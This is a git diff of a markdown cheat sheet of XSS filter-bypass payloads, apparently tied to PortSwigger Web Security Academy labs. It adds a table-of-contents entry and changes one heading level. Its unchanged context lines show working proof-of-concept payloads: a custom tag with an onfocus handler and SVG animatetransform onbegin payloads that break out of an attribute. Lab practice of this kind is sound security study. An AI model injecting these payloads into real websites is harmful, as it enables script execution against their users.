@@ -1,4 +1,5 @@
 # Contents
+* [For html Injection](#For-html-Injection)
 * [Angle brackets HTML-encoded bypass](#Angle-brackets-HTML-encoded-bypass)
 * [Tags and Attribute Block Bypass](#Tags-and-Attribute-Block-Bypass)
 * [Reflected XSS with some SVG markup allowed](#Reflected-XSS-with-some-SVG-markup-allowed)
@@ -89,7 +90,7 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-cont
 ```
 <custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
 ```
-### Reflected XSS with some SVG markup allowed
+## Reflected XSS with some SVG markup allowed
 ```
 "><svg><animatetransform onbegin=alert(1337)></animatetransform></svg>
 "><svg><animatetransform onbegin='alert(1337)'></animatetransform></svg>
